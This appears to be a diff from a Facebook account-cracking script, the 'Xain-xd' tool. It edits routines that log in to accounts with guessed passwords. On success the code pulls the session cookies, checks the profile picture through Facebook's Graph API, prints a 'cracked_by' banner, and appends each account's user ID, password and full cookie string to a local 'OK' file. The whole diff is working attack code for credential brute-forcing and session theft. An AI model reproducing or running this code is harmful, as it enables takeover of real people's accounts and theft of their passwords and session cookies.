@@ -273,12 +273,13 @@ def renmeth1(uid,pwx,tl,qw):
             if "c_user" in log_cookies:
                 kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                 uid = re.search('user=(.*?);',str(kukis)).group(1)
-           #     uid = re.findall('c_user=(.*);xs', kukis)[0]
-                oks.append(uid)
-                print(f"\r\r[b]"+xain_co(oks)+f" [bright_green]{uid} [orange3]▶ [bright_green]{ps}               \n{animi(oks)}sb=cracked_by.Xain-xd:tool;"+kukis.replace("-1","1")+"\n")
-                open("/sdcard/XAIN XD/XAIN-OK.txt","a").write(uid+"|"+ps+"|"+kukis+"\n")
-
-                break
+                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
+                res = requests.get(ckk).text
+                if 'Photoshop' in res:
+                    oks.append(uid)
+                    print(f"\r\r[b]"+xain_co(oks)+f" [bright_green]{uid} [orange3]▶ [bright_green]{ps}               \n{animi(oks)}sb=cracked_by.Xain-xd:tool;"+kukis.replace("-1","1")+"\n")
+                    open("/sdcard/XAIN XD/XAIN-OK.txt","a").write(uid+"|"+ps+"|"+kukis+"\n")
+                    break            
             else:
                 continue
         except requests.exceptions.ConnectionError:
@@ -301,7 +302,7 @@ def renmeth3(uid,pwx,tl,qw):
             log_cookies=session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
                 kukis = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                uid = re.findall('c_user=(.*);xs', kukis)[0]
+                uid = re.search('user=(.*?);',str(kukis)).group(1)
                 ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
